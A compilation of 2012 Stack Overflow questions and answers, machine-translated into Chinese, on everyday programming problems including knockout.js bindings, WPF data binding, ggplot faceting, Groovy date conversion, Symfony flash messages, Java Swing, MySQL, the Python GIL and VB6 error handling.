这个[答案](https://stackoverflow.com/a/7049934/794088)有更明确的信息。我希望这可以帮助你埃里克。

# knockout.js - 淘汰赛未检测到变化

> ID：12603647
> 
> 赞同：0
> 
> 时间：2012-09-26T14:09:53.013
> 
> 标签：knockout.js

我有一个带有 knockout.js 模型的页面。我通过绑定序列化对象的计算属性将数据“序列化”到 JSON 格式的文本框。

**工作部件的选择：**

**查看模型**

```
function CourseParticipant(name, facility) {
    var self = this;
    self.name = ko.observable(name);
    self.facility = ko.observable(facility);
}

function CourseParticipantViewModel() {
    var self = this;

    self.participants = ko.observableArray();
    self.participants.push(new CourseParticipant("Greg", "init"));

    self.addParticipant = function(participant) {
        self.participants.push(new CourseParticipant("", ""));
    }

    self.removeParticipant = function(participant) {
        self.participants.remove(participant);
    }

    self.serializedValue = ko.computed(function() {
        return ko.toJSON(self.participants(), null, null);
    }, self);
}

ko.applyBindings(new CourseParticipantViewModel());

$("#btn").click(function(){
    $(".fac").val('val');
}) 
```

**HTML**

```
<table class='pc-tbl'>
<tbody data-bind="foreach: participants">

  <tr><td colspan='100%'>
      <a href="#" data-bind="click: $root.removeParticipant">x</a></td></tr>
  <tr>
       <th>Name:</th>
       <td><input data-bind="value: name" /></td>
  </tr>
  <tr>
    <th>Facility:</th>
    <td><input data-bind="value: facility" class='fac' /></td>
  </tr>
</tbody>
</table>
<br />
<textarea data-bind="value: serializedValue()" style='width:300px; height:100px;'></textarea>
<a href="#" data-bind="click: addParticipant">Add Participant</a>

<input type=button id='btn' value='test'  /> 
```

我遇到问题的部分是让 Knockout 在通过 JavaScript 编辑表单时检测到更改。可以在此处找到该问题的示例：http: [//jsfiddle.net/oglester/tQzu2/](http://jsfiddle.net/oglester/tQzu2/)

问题是当您单击测试按钮并更新表单时，模型不会更新。如何强制表单通知视图模型？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:18:00.607

反过来做：http: [//jsfiddle.net/tQzu2/1/](http://jsfiddle.net/tQzu2/1/)

Knockout 根据其模型更新 UI，即您将元素绑定到模型，反之亦然。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:21:32.957

这可能是因为通过`val()`方法更改输入值不会触发`change`事件。更改输入值后尝试`change`手动触发事件

```
$("#btn").click(function(){
    $(".fac").val('val');
    $(".fac").trigger('change');
}) 
```

但是，如果绑定触发器设置为“更改”以外的其他值，这可能不起作用。

示例：http: [//jsfiddle.net/zSmSY/](http://jsfiddle.net/zSmSY/)

# c# - WPF 用户控件中的数据绑定

> ID：12603653
> 
> 赞同：1
> 
> 时间：2012-09-26T14:10:12.640
> 
> 标签：c#, wpf, vb.net, data-binding, user-controls

一个看似简单的问题让我陷入了僵局。我有一个包含 TextBlock 的用户控件。我希望绑定 TextBlock 的几个属性（Text、FontSize、Foreground、Background、Margin）。我在想，与其创建一大堆代码和 5 个 DependencyProperties，不如简单地为这些属性创建一个小类并简单地注册它。

这是我在 UserControl.xaml 中的内容

```
<TextBlock Grid.Row="1" Grid.RowSpan="1" DataContext="XTitle"
                   Text="{Binding ElementName=MultiButton, Path=XTitle.Text, FallbackValue='Heart-Rate'}" 
                   FontSize="{Binding ElementName=MultiButton, Path=XTitle.FontSize, FallbackValue='26'}" 
                   Foreground="{Binding ElementName=MultiButton, Path=XTitle.ForeColor, FallbackValue='White'}" 
                   Background="{Binding ElementName=MultiButton, Path=XTitle.Background, FallbackValue='Black'}" 
                   TextAlignment="Center" VerticalAlignment="Center" /> 
```

在 (userControl.xaml.vb) 后面的代码中，我有这个：

```
 Public Shared ReadOnly XTitleProperty As DependencyProperty

    Shared Sub New()
        XTitleProperty = DependencyProperty.Register("XTitle", GetType(TextPart), GetType(MultiButton))
    End Sub

    Public Property XTitle As TextPart
        Get
            Return CType(GetValue(XTitleProperty), TextPart)
        End Get
        Set(value As TextPart)
            SetValue(XTitleProperty, value)
        End Set
    End Property

    Public Class TextPart
        Property Text As String = "ABCD"
        Property FontSize As Single = 16
        Property Foreground As Color = Colors.Yellow
        Property Background As Color = Colors.Black
    End Class 
```

在 Window.xaml 中（我只是想让这一切正常工作，因此暂时没有 MVVM）：

```
<Grid>
    <lbUserControl:MultiButton XTitle="{Binding SensorTitle}"/>
</Grid> 
```

最后在 Window.xaml.vb 代码隐藏中，我们有这个：

```
 Private _sensorTitle As MultiButton.TextPart

    Public ReadOnly Property SensorTitle() As MultiButton.TextPart
        Get
            Return _sensorTitle
        End Get

    End Property

    Public Sub New()
        _sensorTitle = New MultiButton.TextPart
        _sensorTitle.Text = "HRM"
        _sensorTitle.FontSize = 16
        _sensorTitle.Foreground = Colors.Cyan
        _sensorTitle.Background = Colors.SaddleBrown
    End Sub 
```

我显然在某个地方错过了一个技巧，因为我认为数据绑定根本没有参与。很高兴收到 vb 或 c# 中的评论。谢谢。

# r - ggplot facet_wrap 图

> ID：12603662
> 
> 赞同：0
> 
> 时间：2012-09-26T14:10:59.357
> 
> 标签：r, ggplot2

我的数据集如下所示：

X

```
date server cpu
1/1/2012 A  80
1/1/2012 B  20
1/1/2012 C  10
1/2/2012 A  80
1/2/2012 B  20
1/2/2012 C  10
1/3/2012 A  80
1/3/2012 B  20
1/3/2012 C  10
1/4/2012 A  80
1/4/2012 B  20
1/4/2012 C  10
1/5/2012 A  80
1/5/2012 B  20
1/5/2012 C  10
1/6/2012 A  80
1/6/2012 B  20
1/6/2012 C  10 
```

我喜欢使用 ggplot facet_wrap 为每个服务器创建一个单独的图表（除非有更好的方法来做到这一点？）

我的代码是这样的：

```
ggplot(x, aes(date, cpu, group=server, colour=server)) 
+ geom_point() 
+ facet_wrap(~server) 
+ ylim(0,100) 
+ theme_bw() 
+ geom_smooth(method="lm", se=TRUE, size=1) 
+ xlab("Date") 
+ ylab("CPU") 
+  opts(title="% CPU"),plot.title=theme_text(size=14, colour="navyblue"),axis.title.x = theme_text(face="bold", size=12, colour="#990000"), axis.text.x  = theme_text(angle=90, size=9, face="bold"),axis.title.y = theme_text(face="bold", size=12, colour="#990000", angle=90), axis.text.y=theme_text(size=9, face="bold", hjust=1)) + opts(legend.position = "none") 
+ opts(strip.text.x = theme_text(size=10, face="bold", colour="navyblue"), strip.background = theme_rect(colour="blue", fill="#98CAFF")) 
```

这有点工作，但我有两个问题：

1.  如果主机的数量不是均匀对齐的，这意味着有时，由于主机的数量可能是奇数，最后一行的网格可能比前几行少。因此，最后一行网格图有日期，但最后一行之前的行没有日期。如何确保最后一行之前的行有日期？
2.  由于我将为此编写脚本，因此某些数据帧可能具有更多数量的服务器。根据服务器的数量，我需要调整 png 大小。例如，如果服务器的数量是 20，我需要图像的高度为 500，宽度为 200。有没有办法在 ggplot2 中做到这一点？你可能有这个想法。除了ggplot2，还有其他方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T18:03:11.043

关于问题 2，您可以使用`ggsave`一些伪代码来保存最后生成的绘图，该伪代码将绘图宽度基于服务器的数量：

```
ggplot(...) + 
   etc()
if(noServers > 20) plot_width = 500
ggsave("name.png", width = plot_width) 
```

# web-applications - 嵌入式 Tomcat 和 Web 应用程序的不同 Log4j

> ID：12603663
> 
> 赞同：0
> 
> 时间：2012-09-26T14:10:59.870
> 
> 标签：web-applications, log4j, overriding, embedded-tomcat-7

我正在使用嵌入式 Tomcat（版本 7.028）。我的嵌入式 Tomcat 服务器是一个可配置的服务器，可以向其添加一个或多个 Web 应用程序。

我想将 Embedded Tomcat 中的错误/信息消息记录在一个日志文件中，并为 Embedded Tomcat 上部署的所有应用程序维护不同的日志文件。我在嵌入式 Tomcat 的类路径中放置了一个 log4j.properties 文件。它正在被正确读取，我能够记录 Tomcat 的信息和错误消息。我还将嵌入式 Tomcat 中的所有记录器声明为非静态的。

我已将 log4j.xml 放在 webapp 的 WEB-INF/classes 位置以覆盖嵌入式 Tomcat 的 log4j.properties（参考[链接](https://stackoverflow.com/questions/4258849/override-log4j-properties)）。但是 log4j.xml 没有被启动。仅使用 Tomcat 的 log4j 设置。

请帮助我如何克服这个问题。是否有任何配置可以添加到 xml 或属性文件中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-20T01:19:15.693

请尝试在每个 Web 应用程序中添加 log4j jar（我的意思是在 WEB-INF/lib 中），我认为这可能会解决您的问题。

# groovy - 在 Groovy / Java 中将 UTC 日期转换为 GMT

> ID：12603672
> 
> 赞同：0
> 
> 时间：2012-09-26T14:11:27.420
> 
> 标签：groovy, utc, datetime-format, gmt, date-conversion

我正在使用 SoupUI，我需要调整我在响应 GMT 日期/时间时返回的日期/时间 (UTC)。我收到回复的日期如下：

```
2012-11-09T00:00:00+01:00 
```

我想将其转换为

```
2012-11-08T23:00:00Z 
```

不幸的是，我缺乏 Java 技能，因此也缺乏 Groovy 技能，无法自己做到这一点。我对日期转换做了很多搜索，但直到现在我仍然无法找到我想要的东西。我会继续寻找。如果我确实设法获得了解决方案，那么我将在此处发布。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T15:09:08.613

假设时区部分没有冒号，我相信这应该有效：

```
// Your input String (with no colons in the timezone portion)
String original = '2012-11-09T00:00:00+0100'

// The format to read this input String
def inFormat = new java.text.SimpleDateFormat( "yyyy-MM-dd'T'HH:mm:ssZ" )

// The format we want to output
def outFormat = new java.text.SimpleDateFormat( "yyyy-MM-dd'T'HH:mm:ss'Z'" )
// Set the timezone for the output
outFormat.timeZone = java.util.TimeZone.getTimeZone( 'GMT' )

// Then parse the original String, and format the resultant
// Date back into a new String
String result = outFormat.format( inFormat.parse( original ) )

// Check it's what we wanted
assert result == '2012-11-08T23:00:00Z' 
```

如果TimeZone*中*有冒号，则需要[Java 7](http://docs.oracle.com/javase/7/docs/api/java/text/SimpleDateFormat.html)来执行此任务（或者可能需要像 JodaTime 这样的日期处理框架），并且可以将前两行更改为：

```
// Your input String
String original = '2012-11-09T00:00:00+01:00'

// The format to read this input String (using the X
// placeholder for ISO time difference)
def inFormat = new java.text.SimpleDateFormat( "yyyy-MM-dd'T'HH:mm:ssX" ) 
```

# symfony - 在 Symfony 2.1 中，Flash 消息在重定向时消失

> ID：12603675
> 
> 赞同：5
> 
> 时间：2012-09-26T14:11:37.303
> 
> 标签：symfony, symfony-2.1, flash-message

我正在从 Symfony 2.0 迁移到 Symfony 2.1。

我的控制器上有以下简单代码：

```
public function createEntidadeAction() {
    $this->get('session')->getFlashBag()->set('error', 'message');
    return $this->redirect($this->generateUrl('EntidadeBundle_index'));
} 
```

如果我产生错误（例如通过错误的路由），我会在分析器上检查闪存消息是否存在。

但是，如果我让重定向成功，则 Flash 消息会消失并且什么也不会显示。我在相应的 Twig 模板上有以下内容：

```
{% for flashMessage in app.session.flashbag.get('error') %}
    <div class="flash-notice">
        {{ flashMessage }}
    </div>
{% endfor %} 
```

我想不通。我错过了什么？Flash 消息应该在第一次重定向之后持续，不是吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-26T14:32:14.467

首先，尝试使用该`add`方法而不是`set`在闪存包上。其次，试试这个适合我的模板：

```
{% for type, flashMessages in app.session.flashbag.all() %}
    {% for flashMessage in flashMessages %}
        <div class="alert alert-{{ type }}">
            {{ flashMessage|trans }}
        </div>
    {% endfor %}
{% endfor %} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-27T10:54:33.780

我想到了。

由于会话问题，没有显示 Flash 消息。

Symfony 2.1 现在默认使用 session.storage.native 作为 storage_id 和 handler_id。

[请在此处](https://stackoverflow.com/questions/12618953/symfony-2-1-session-local-value-and-master-value-read-on-phpinfo)查看此会话问题是如何解决的。

# java - 如何找到一部分网格的坐标？

> ID：12603676
> 
> 赞同：1
> 
> 时间：2012-09-26T14:11:36.770
> 
> 标签：java, swing, imageicon

我制作了一个小程序，用户给出加载在 ImageIcon 上的图像的地址，并在其上显示一个网格。

我现在希望在鼠标单击图片的情况下获得网格的位置或 x,y 坐标。

这是我的代码

```
import java.awt.*;
import java.awt.image.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import javax.imageio.ImageIO;
import javax.swing.*;

class GridLines {

public static void main(String[] args) throws IOException {
    System.out.println("Enter image name\n");
    BufferedReader bf=new BufferedReader(new
            InputStreamReader(System.in));
    String imageName= null;
    try {
        imageName = bf.readLine();
    } catch (IOException e) {
        e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
    }
    File input = new File(imageName);

    Dimension imgDim = new Dimension(200,200);
    BufferedImage mazeImage = new BufferedImage(imgDim.width, imgDim.height, BufferedImage.TYPE_INT_RGB);
    mazeImage = ImageIO.read(input);
    Integer k = mazeImage.getHeight();
    Integer l = mazeImage.getWidth();
    Graphics2D g2d = mazeImage.createGraphics();
    g2d.setBackground(Color.WHITE);
    //g2d.fillRect(0, 0, imgDim.width, imgDim.height);
    g2d.setColor(Color.RED);
    BasicStroke bs = new BasicStroke(1);
    g2d.setStroke(bs);
    // draw the black vertical and horizontal lines
    for(int i=0;i<21;i++){
        // unless divided by some factor, these lines were being
        // drawn outside the bound of the image..
            g2d.drawLine((l+2)/4*i, 0, (l+2)/4*i,k-1);
            g2d.drawLine(0, (k+2)/5*i, l-1, (k+2)/5*i);
    }

    ImageIcon ii = new ImageIcon(mazeImage);
    JOptionPane.showMessageDialog(null, ii);
} 
```

}

希望我能得到一些帮助。提前致谢 ：）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T14:55:39.853

基本思想是将[MouseListener](http://docs.oracle.com/javase/7/docs/api/java/awt/event/MouseListener.html)添加到组件中。在您的情况下，您使用了不提供对显示组件的访问的 JOptionPane。无论如何，JOptionPane 不是为此目的而制作的。

所以我冒昧地从一个完全不同的角度来解决这个问题。该代码远非完美（例如，所有内容都在一个类中），但它为您提供了如何开始的提示。我认为这将为开始提供更好的基础。

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.File;
import java.io.IOException;

import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.filechooser.FileFilter;

class GridLines {

    private JFrame frame;

    class MyGridPanel extends JPanel {
        private static final int ROWS = 4;
        private static final int COLS = 5;

        class CellPanel extends JPanel {
            int x;
            int y;

            public CellPanel(final int x, final int y) {
                setOpaque(false);
                this.x = x;
                this.y = y;
                MouseListener mouseListener = new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e) {
                        JOptionPane.showMessageDialog(CellPanel.this, "You pressed the cell with coordinates: x=" + x + " y=" + y);
                    }
                };
                setBorder(BorderFactory.createMatteBorder(1, 1, 1, 1, Color.RED));
                addMouseListener(mouseListener);
            }

        }

        private final ImageIcon image;

        public MyGridPanel(ImageIcon imageIcon) {
            super(new GridLayout(ROWS, COLS));
            this.image = imageIcon;
            for (int i = 0; i < ROWS; i++) {
                for (int j = 0; j < COLS; j++) {
                    add(new CellPanel(i, j));
                }
            }
            // Call to setPreferredSize must be made carefully. This case is a good reason.
            setPreferredSize(new Dimension(imageIcon.getIconWidth(), imageIcon.getIconHeight()));
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            g.drawImage(image.getImage(), 0, 0, this);
        }
    }

    protected void initUI() {
        frame = new JFrame(GridLines.class.getSimpleName());
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setResizable(false);
        File file = selectImageFile();
        if (file != null) {
            ImageIcon selectedImage = new ImageIcon(file.getAbsolutePath());
            frame.add(new MyGridPanel(selectedImage));
            frame.pack();
            frame.setVisible(true);
        } else {
            System.exit(0);
        }
    }

    public File selectImageFile() {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        fileChooser.setFileFilter(new FileFilter() {

            @Override
            public String getDescription() {
                return "Images files (GIF, PNG, JPEG)";
            }

            @Override
            public boolean accept(File f) {
                if (f.isDirectory()) {
                    return true;
                }
                String fileName = f.getName().toLowerCase();
                return fileName.endsWith("gif") || fileName.endsWith("png") || fileName.endsWith("jpg") || fileName.endsWith("jpeg");
            }
        });
        int retval = fileChooser.showOpenDialog(frame);
        if (retval == JFileChooser.APPROVE_OPTION) {
            return fileChooser.getSelectedFile();
        }
        return null; // Cancelled or closed
    }

    public static void main(String[] args) throws IOException {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (InstantiationException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (UnsupportedLookAndFeelException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                new GridLines().initUI();
            }
        });
    }
} 
```

# mysql - SQL - 在 SELECT 中使用子查询的结果

> ID：12603677
> 
> 赞同：0
> 
> 时间：2012-09-26T14:11:51.740
> 
> 标签：mysql, sql

例子：

```
SELECT
    (
        ...
    ) AS imageName,
    (
        ...
    ) AS imageURL,
    CONCAT(imageName, ' ', imageURL) 
```

我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:13:35.493

您可以执行以下操作，但要注意表的别名：

```
 SELECT
     T.imageName, T.imageURL
     CONCAT(imageName, ' ', imageURL)
   FROM 
   (
       SELECT
      (
        ...
       ) AS imageName,
       (
        ...
      ) AS imageURL
       FROM ... AS innerT
   ) T 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:14:08.003

您可以在 CONCAT 中完成所有操作，如下所示：

```
select CONCAT(( select ... ), ' ', ( select ... )) 
```

# python - python web服务器如何克服GIL

> ID：12603678
> 
> 赞同：16
> 
> 时间：2012-09-26T14:11:53.743
> 
> 标签：python, django, concurrency, webserver

任何 Web 服务器都可能必须同时处理大量请求。由于python解释器实际上有GIL约束，那么并发是如何实现的呢？

他们是否使用多个进程并使用 IPC 进行状态共享？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:43:04.620

您通常有许多工人（即 gunicorn），每个工人都有独立的请求。其他一切（与并发相关的）都由数据库处理，因此它是从您那里抽象出来的。

你不需要 IPC，你只需要一个“单一数据源”，它将是 RDBMS、一个缓存服务器（redis、memcached）等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:43:25.387

首先，请求可以独立处理。但是，服务器希望*同时*处理它们，以便将每次可以处理的请求数保持在最大值。

这个*并发*概念的实现依赖于网络服务器。

一些实现可能有固定数量的线程或进程来处理请求。如果所有请求都在使用中，则必须等待处理其他请求。

另一种可能性是为每个请求生成一个进程或线程。为每个请求生成一个进程会导致荒谬的内存和 CPU 开销。产生轻量级线程更好。这样做，您可以每秒为数百个客户提供服务。然而，线程也带来了管理开销，表现在高内存和 CPU 消耗上。

对于每秒服务数千个客户端，基于异步协程的事件驱动架构是最先进的解决方案。它使服务器能够以高速率为客户端提供服务，而无需产生数以亿计的线程。在[所谓的 C10k 问题的 Wikipedia 页面上，](http://en.wikipedia.org/wiki/C10k_problem)您可以找到 Web 服务器的列表。其中，许多人使用这种架构。

协程也可用于 Python。看看[http://www.gevent.org/](http://www.gevent.org/)。这就是为什么基于例如[uWSGI](http://projects.unbit.it/uwsgi/) + gevent 的 Python WSGI 应用程序是一个非常高效的解决方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:20:59.047

像平常一样。Web 服务主要受 I/O 限制，并且 GIL 在 I/O 操作期间释放。因此，要么在没有任何特殊调整的情况下使用线程，要么使用事件循环（例如 Twisted）。

# javascript - Javascript：验证特殊字符

> ID：12603679
> 
> 赞同：1
> 
> 时间：2012-09-26T14:11:57.737
> 
> 标签：javascript, jquery

我正在做一些验证，似乎无法全神贯注地检查特殊字符，不应该使用任何字符。目前我获取值，创建一个数组并检查大写和数字。我还需要一种方法来检查特殊字符。我发现的另一个小问题是在输入数字时它会传递一个大写字母。只是寻找一些关于如何解决这个问题的方向。

```
$('.tooltip').on({  
    focusin: function(){ //make
        var top = $(this).offset().top 
        var left = $(this).offset().left + $(this).outerWidth()

        $('.tip').remove()
        $('body').append("<div class='tip' style='top:"+ top +"px;left:"+left+"px;'><div class='arrow'></div></div>")
        $('.tip').animate({width: 'show', opacity: 'show'})
        $(tipContent).appendTo('.tip')
    },
    focusout: function(){ //remove
        $('.tip').fadeOut(function(){$(this).remove()})
    },
    keyup: function(){ if (event.keyCode == 16) return //validate       
        var val = $(this).val()
        validate(val.split(""), val);
    },
})

function validate(letters, val){
    for (var i = 0; i < letters.length; i++){
        if( letters[i] === letters[i].toUpperCase() ) { //uppercase check
              console.log(letters[i] + ": " + 'Uppercase Passed');
        }else{console.log('Uppercase Failed');
        } 

        if( letters.length >= 9 ) { //min limit
              console.log(letters[i] + ": " + 'Minimum Limit Passed');
        }else{console.log('Minimum Limit Failed');
        }

        if( parseInt(letters[i]) > 0 ) { //number check
              console.log(parseInt(letters[i]) + ' passed');
        }else{console.log('at least 1 char failed');
        } 
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:22:03.803

一个选项可能是使用[正则表达式](http://www.regular-expressions.info/)，这使您的需求易于表述：

```
function validate(value) {
    var regex = /^[A-Z0-9]*$/; // consist only of uppercase letters and digits
    var digit = /\d/; // contains a digit
    if (regex.test(value) && digit.test(value) && value.length >= 9)
        console.log("Test passed");
    else
        console.log("Test failed");
} 
```

您甚至可以将它们组合成一个正则表达式：

```
function validate(value) {
    return /^(?=.*\d)[A-Z0-9]{9,}$/.test(value);
//          |   |         |      |
//   string /   |     consists   \ string end
// beginning    |     of only
//              /     upper alphabet letters and numbers,
// somewhere ahead     at least 9 of them
// comes a digit
} 
```

* * *

好的，如果您需要单独执行这些步骤，我们应该可以做到。要识别大写字母，我们可以使用正则表达式`[A-Z]`，但随后将无法识别变音符号等。如果您将它们作为特殊字符处理，我们可以轻松使用此正则表达式：

```
/^(?=.*\d)(?=.*[A-Z])(?=.*[^A-Za-z0-9]).{9,}$/
       |         |              |
     digit   uppercase    special char 
```

如果您不希望这样（或将相同的正则表达式应用为单步），我们可以测试具有以下条件的特殊字符：它不能大写或小写，也不是数字。

```
function validation(value) {
    var uc = false,
        lc = false,
        sc = false,
        di = false,
        len = value.length;
    for (var i=0; i<len; i++) {
        var letter = value.charAt(i),
            isUpper = letter.toUppercase() == letter,
            isLower = letter.toLowercase() == letter;
        if (isUpper && !isLower)
            uc = true;
        else if (isLower && !isUpper)
            uc = true;
        else // isLower && isUpper - no alphabetic character
            if (/\d/.test(letter))
                di = true;
            else
                sc = true;
    }
    return {
        someUppercase: uc,
        someLowercase: lc,
        someSpecial: sc,
        someDigit: di,
        length: len,
        longEnough: len >= 9
    };
} 
```

# c# - T 实现运算符的通用方法

> ID：12603689
> 
> 赞同：0
> 
> 时间：2012-09-26T14:12:25.083
> 
> 标签：c#, generics, where-clause

> **可能重复：**
> [.NET 泛型中重载运算符约束的解决方案](https://stackoverflow.com/questions/147646/solution-for-overloaded-operator-constraint-in-net-generics)

我有方法

```
 public static T Add<T>(T x, T y) 
    {
        return x + y;
    } 
```

而且我显然会收到编译错误，因为类型 T 可能不支持运算符 + 。例如，如果我在哪里调用该方法：

```
 Add<MyCar>(car1, car2); 
```

无法调用该方法，因为 MyCar 类没有`+`运算符的定义。

但是将该方法称为：

```
 Add<Int32>(1,2); 
```

所以我记得我很久以前读过，我必须在方法上放置一个 where 子句才能编译它。有点像：

```
 public static T Add<T>(T x, T y) where T: "implements + operator"
    {
        return x + y;
    } 
```

但我不记得语法。

# android - 自定义对话框中的 Android 文本视图选项

> ID：12603692
> 
> 赞同：0
> 
> 时间：2012-09-26T14:12:29.347
> 
> 标签：android, textview, customdialog

我创建了自定义对话框，其中有 textview。文本非常靠近我的对话框的边缘，所以我想知道我是否可以在我的文本和对话框的左右边缘之间设置一些空间以及如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:15:07.100

在自定义对话框的 xml 布局中，将以下内容添加到根目录：

```
android:padding="10dp" 
```

或您认为合适的任何值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:16:26.317

你需要`TextView`用一些`marginLeft`和`marginRight`属性来创建你的。这些将在您`TextView`和屏幕的左右边缘之间留出一些空间。

还可以考虑使用`paddingLeft`,`paddingRight`属性来确保您的边框`TextView`和实际文本本身之间有一些空间。

[在此处](http://developer.android.com/reference/android/widget/TextView.html)查看有关如何在`TextView`.

# javascript - 当 css3 转换不可用时自动回退到 jquery（Internet Explorer）

> ID：12603697
> 
> 赞同：0
> 
> 时间：2012-09-26T14:12:43.393
> 
> 标签：javascript, jquery, css, transition, fallback

当没有可用的 css3 时（例如在 Internet Explorer 9 中），是否有提供自动回退到 jquery 的库（或 jquery 扩展）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:20:18.540

我认为[modernizr](http://modernizr.com/)会为你工作。

> Modernizr 是一个小型 JavaScript 库，用于检测下一代 Web 技术的本地实现的可用性，即源自 HTML5 和 CSS3 规范的特性。其中许多功能已经在至少一个主流浏览器中实现（大多数在两个或更多浏览器中实现），Modernizr 所做的很简单，告诉你当前浏览器是否原生实现了这个功能。

这个库使用了一些`Polyfills`针对不支持 HTML5 或 CSS3 功能的情况。

> polyfill (n)：一个 JavaScript 垫片，为旧版浏览器复制标准 API
> 
> 对您来说好消息是，Modernizr 检测到的几乎所有 HTML5 功能都有一个 polyfill。是的。因此，在大多数情况下，您可以使用 HTML5 或 CSS3 功能，并能够在不支持的浏览器中复制它。是的，您不仅现在可以使用 HTML5，而且您过去也可以使用它！

# vb6 - 重试运行时错误

> ID：12603698
> 
> 赞同：2
> 
> 时间：2012-09-26T14:12:47.530
> 
> 标签：vb6, error-handling

我遇到过几次这个问题，但一直无法解决，但现在我需要一劳永逸地解决它。

我有一个程序一直在抛出运行时错误。这不是问题，因为我在函数顶部定义了一个错误处理程序，在底部定义了一个处理程序，如下所示：

```
retryConcat:
On Local Error GoTo concatErr
    'Some Code here
    Exit Sub
concatErr:
    If MsgBox("Could not append the receipt for this transaction to the Receipt viewer logs.", vbExclamation + vbRetryCancel, "Warning - Missing Receipt") = vbRetry Then
        err.Clear
        GoTo retryConcat
    End If 
```

错误处理程序包含一个消息框，允许用户在需要时重试。现在这是让我感到困惑的部分。第一次抛出错误时，它会显示消息框并允许用户按预期重试。然后程序跳转到适当的行并再次尝试。但是，第二次抛出错误时，它不会跳转到错误处理程序，而是跳出过程，而父级中的错误处理程序会捕获它！

所以我的问题是为什么它会在后续抛出时跳转到父错误处理程序。这发生在我的代码中的许多地方。在许多我可以手动检查错误的情况下，我可以将代码粘贴在 while 循环中来解决它，但是对于运行时错误，我不得不使用错误捕获，它以这种相当烦人的方式起作用。

任何帮助或建议将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T14:33:45.390

你不需要使用`Resume retryConcat`.

当发生错误时，它会跳转到错误句柄中`concatErr:`。然后显示消息框，如果用户选择重试，代码将跳转到`retryConcat`. 正如您使用的那样`Goto`，它不会退出错误处理程序，因此下次发生错误时，它已经在错误处理程序中并且别无选择，只能将错误向上提升到调用过程。

Using`Resume concatRetry`允许它退出错误处理程序并在所需的点恢复，这意味着下次发生错误时，它可以再次处理。

如果您想象错误处理程序是一个状态，而不是一段代码，它可能更容易理解。

# android - 已发布应用程序上的 Android ClassNotFoundException

> ID：12603699
> 
> 赞同：1
> 
> 时间：2012-09-26T14:12:52.373
> 
> 标签：android, classnotfoundexception

我有一个在 Google play 上发布了一段时间的应用程序，我一直在修复报告的错误，但最近下面的日志出现了，我不知道该怎么做：

```
java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.mammothtooth.flightinfo/com.mammothtooth.flightinfo.ui.SplashActivity}: java.lang.ClassNotFoundException: com.mammothtooth.flightinfo.ui.SplashActivity in loader dalvik.system.PathClassLoader[/system/framework/com.google.android.maps.jar:/mnt/asec/com.mammothtooth.flightinfo-1/pkg.apk]
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1743)
at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1851)
at android.app.ActivityThread.access$1500(ActivityThread.java:132)
at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1038)
at android.os.Handler.dispatchMessage(Handler.java:99)
at android.os.Looper.loop(Looper.java:150)
at android.app.ActivityThread.main(ActivityThread.java:4277)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:507)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
at dalvik.system.NativeStart.main(Native Method)
Caused by: java.lang.ClassNotFoundException: com.mammothtooth.flightinfo.ui.SplashActivity in loader dalvik.system.PathClassLoader[/system/framework/com.google.android.maps.jar:/mnt/asec/com.mammothtooth.flightinfo-1/pkg.apk]
at dalvik.system.PathClassLoader.findClass(PathClassLoader.java:240)
at java.lang.ClassLoader.loadClass(ClassLoader.java:551)
at java.lang.ClassLoader.loadClass(ClassLoader.java:511)
at android.app.Instrumentation.newActivity(Instrumentation.java:1040)
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1735) 
```

